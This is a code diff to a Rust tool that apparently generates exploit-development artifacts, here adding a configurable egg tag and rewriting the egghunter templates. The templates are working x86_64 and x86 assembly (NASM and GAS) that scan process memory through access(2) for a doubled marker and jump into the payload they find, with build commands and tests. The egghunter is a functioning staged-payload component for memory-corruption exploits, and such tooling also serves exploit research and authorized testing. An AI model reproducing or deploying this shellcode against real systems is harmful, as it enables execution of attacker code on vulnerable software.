@@ -48,6 +48,18 @@ pub struct Meta<'a> {
     pub model: Option<&'a str>,
     pub timestamp: &'a str,
     pub header_comment: bool,
+    /// Egg tag for egghunter (cleaned hex, no `0x`); `None` uses the default.
+    pub egg: Option<&'a str>,
+}
+
+/// Repeat/truncate a cleaned hex string to exactly `width` hex digits, so the
+/// egg fills the arch's tag size without introducing NUL bytes.
+fn fill_hex(h: &str, width: usize) -> String {
+    let mut s = String::new();
+    while s.len() < width {
+        s.push_str(h);
+    }
+    s[..width].to_string()
 }
 
 pub struct File {
@@ -90,7 +102,7 @@ pub fn build(meta: &Meta, requested: &[Syntax]) -> Vec<File> {
     syntaxes
         .into_iter()
         .map(|syn| {
-            let (src, assemble) = source(meta.artifact, meta.arch, syn);
+            let (src, assemble) = source(meta.artifact, meta.arch, syn, meta.egg);
             let body = if meta.header_comment {
                 format!("{}\n{src}\n", header(meta, syn, &assemble))
             } else {
@@ -164,10 +176,10 @@ fn header(meta: &Meta, syn: Syntax, assemble: &str) -> String {
 }
 
 /// Returns (source, assemble-command).
-fn source(artifact: &str, arch: &str, syn: Syntax) -> (String, String) {
+fn source(artifact: &str, arch: &str, syn: Syntax, egg: Option<&str>) -> (String, String) {
     match artifact {
         "shellcode" => shellcode(arch, syn),
-        "egghunter" => egghunter(arch, syn),
+        "egghunter" => egghunter(arch, syn, egg),
         "loader" => loader(arch, syn),
         "ret2" => ret2(arch, syn),
         _ => shellcode(arch, syn),
@@ -289,94 +301,106 @@ _start:
 
 // ── access(2) egghunter ─────────────────────────────────────────────────────
 
-fn egghunter(arch: &str, syn: Syntax) -> (String, String) {
+fn egghunter(arch: &str, syn: Syntax, egg: Option<&str>) -> (String, String) {
     match (arch, syn) {
-        ("x86_64" | "amd64", Syntax::Nasm) => (
-            r#"bits 64
-; access(2) egghunter. Place the 8-byte EGG twice at the start of your payload.
-; VERIFY: __NR_access=21, EFAULT low byte=0xf2 on your target.
-global _start
-section .text
-_start:
-    xor    rdx, rdx
-next_page:
-    or     dx, 0x0fff           ; advance to end of page
-next_byte:
-    inc    rdx
-    lea    rdi, [rdx + 4]        ; pathname arg = candidate ptr
-    xor    rsi, rsi             ; mode = 0
-    push   21
-    pop    rax                  ; __NR_access
-    syscall
-    cmp    al, 0xf2             ; -EFAULT? page unmapped -> skip it
-    jz     next_page
-    mov    rax, 0x9090905090905090 ; EGG (match your payload prefix)
-    mov    rdi, rdx
-    scasq                       ; first 8 bytes == EGG?
-    jne    next_byte
-    cmp    qword [rdi], rax     ; second 8 bytes == EGG?
-    jne    next_byte
-    jmp    rdi                  ; found payload -> execute
-"#
-            .to_string(),
-            "nasm -f elf64 egg.nasm -o egg.o && ld egg.o -o egg".into(),
-        ),
-        ("x86_64" | "amd64", Syntax::Gas) => (
-            r#".global _start
-.text
-/* access(2) egghunter — VERIFY __NR_access=21 and -EFAULT=0xf2 on target. */
-_start:
-    xorq   %rdx, %rdx
-next_page:
-    orw    $0x0fff, %dx
-next_byte:
-    incq   %rdx
-    leaq   4(%rdx), %rdi
-    xorq   %rsi, %rsi
-    pushq  $21
-    popq   %rax              /* __NR_access */
-    syscall
-    cmpb   $0xf2, %al
-    je     next_page
-    movabsq $0x9090905090905090, %rax   /* EGG */
-    movq   %rdx, %rdi
-    scasq
-    jne    next_byte
-    cmpq   %rax, (%rdi)
-    jne    next_byte
-    jmp    *%rdi
-"#
-            .to_string(),
-            "as egg.s -o egg.o && ld egg.o -o egg".into(),
-        ),
-        ("x86" | "i386", Syntax::Nasm) => (
-            r#"bits 32
-; skape-style 32-bit access(2) egghunter. EGG = 0x50905090 (x2).
-global _start
-section .text
-_start:
-    xor    edx, edx
-next_page:
-    or     dx, 0x0fff
-next_byte:
-    inc    edx
-    lea    ebx, [edx + 4]
-    push   0x21              ; __NR_access (32-bit)
-    pop    eax
-    int    0x80
-    cmp    al, 0xf2          ; EFAULT
-    jz     next_page
-    mov    eax, 0x50905090   ; EGG
-    mov    edi, edx
-    scasd
-    jnz    next_byte
-    scasd
-    jnz    next_byte
-    jmp    edi
-"#
-            .to_string(),
-            "nasm -f elf32 egg.nasm -o egg.o && ld -m elf_i386 egg.o -o egg".into(),
-        ),
+        ("x86_64" | "amd64", Syntax::Nasm) => {
+            let e = fill_hex(egg.unwrap_or("9090905090905090"), 16);
+            (
+                format!(
+                    "bits 64\n\
+; access(2) egghunter. Prepend the 8-byte EGG (0x{e}) TWICE, back-to-back,\n\
+; immediately before your real payload (16 bytes total).\n\
+; VERIFY: __NR_access=21, -EFAULT low byte=0xf2 on your target.\n\
+global _start\n\
+section .text\n\
+_start:\n\
+    xor    rdx, rdx\n\
+next_page:\n\
+    or     dx, 0x0fff           ; advance to end of page\n\
+next_byte:\n\
+    inc    rdx\n\
+    lea    rdi, [rdx + 4]        ; pathname arg = candidate ptr\n\
+    xor    rsi, rsi             ; mode = 0\n\
+    push   21\n\
+    pop    rax                  ; __NR_access\n\
+    syscall\n\
+    cmp    al, 0xf2             ; -EFAULT? page unmapped -> skip it\n\
+    jz     next_page\n\
+    mov    rax, 0x{e} ; EGG\n\
+    mov    rdi, rdx\n\
+    scasq                       ; first 8 bytes == EGG?\n\
+    jne    next_byte\n\
+    cmp    qword [rdi], rax     ; second 8 bytes == EGG?\n\
+    jne    next_byte\n\
+    jmp    rdi                  ; found payload -> execute\n"
+                ),
+                "nasm -f elf64 egg.nasm -o egg.o && ld egg.o -o egg".into(),
+            )
+        }
+        ("x86_64" | "amd64", Syntax::Gas) => {
+            let e = fill_hex(egg.unwrap_or("9090905090905090"), 16);
+            (
+                format!(
+                    ".global _start\n\
+.text\n\
+/* access(2) egghunter. Prepend the 8-byte EGG (0x{e}) TWICE before your\n\
+   payload. VERIFY __NR_access=21 and -EFAULT=0xf2 on target. */\n\
+_start:\n\
+    xorq   %rdx, %rdx\n\
+next_page:\n\
+    orw    $0x0fff, %dx\n\
+next_byte:\n\
+    incq   %rdx\n\
+    leaq   4(%rdx), %rdi\n\
+    xorq   %rsi, %rsi\n\
+    pushq  $21\n\
+    popq   %rax              /* __NR_access */\n\
+    syscall\n\
+    cmpb   $0xf2, %al\n\
+    je     next_page\n\
+    movabsq $0x{e}, %rax   /* EGG */\n\
+    movq   %rdx, %rdi\n\
+    scasq\n\
+    jne    next_byte\n\
+    cmpq   %rax, (%rdi)\n\
+    jne    next_byte\n\
+    jmp    *%rdi\n"
+                ),
+                "as egg.s -o egg.o && ld egg.o -o egg".into(),
+            )
+        }
+        ("x86" | "i386", Syntax::Nasm) => {
+            let e = fill_hex(egg.unwrap_or("50905090"), 8);
+            (
+                format!(
+                    "bits 32\n\
+; skape-style 32-bit access(2) egghunter. Prepend the 4-byte EGG (0x{e})\n\
+; TWICE (8 bytes) before your payload. EGG must not collide with normal data.\n\
+global _start\n\
+section .text\n\
+_start:\n\
+    xor    edx, edx\n\
+next_page:\n\
+    or     dx, 0x0fff\n\
+next_byte:\n\
+    inc    edx\n\
+    lea    ebx, [edx + 4]\n\
+    push   0x21              ; __NR_access (32-bit)\n\
+    pop    eax\n\
+    int    0x80\n\
+    cmp    al, 0xf2          ; EFAULT\n\
+    jz     next_page\n\
+    mov    eax, 0x{e}   ; EGG\n\
+    mov    edi, edx\n\
+    scasd\n\
+    jnz    next_byte\n\
+    scasd\n\
+    jnz    next_byte\n\
+    jmp    edi\n"
+                ),
+                "nasm -f elf32 egg.nasm -o egg.o && ld -m elf_i386 egg.o -o egg".into(),
+            )
+        }
         _ => unsupported(arch, "egghunter", syn),
     }
 }
@@ -510,7 +534,24 @@ mod tests {
             model: None,
             timestamp: "2026-06-08",
             header_comment: true,
+            egg: None,
         }
+    }
+
+    #[test]
+    fn egghunter_uses_supplied_egg() {
+        let mut m = meta("egghunter", "x86_64");
+        m.egg = Some("deadbeefcafef00d");
+        let files = build(&m, &[Syntax::Nasm]);
+        assert!(files[0].body.contains("0xdeadbeefcafef00d"));
+    }
+
+    #[test]
+    fn egg_is_repeated_to_arch_width() {
+        let mut m = meta("egghunter", "x86_64");
+        m.egg = Some("41424344"); // 4 bytes -> repeated to 8 (16 hex)
+        let files = build(&m, &[Syntax::Nasm]);
+        assert!(files[0].body.contains("0x4142434441424344"));
     }
 
     #[test]
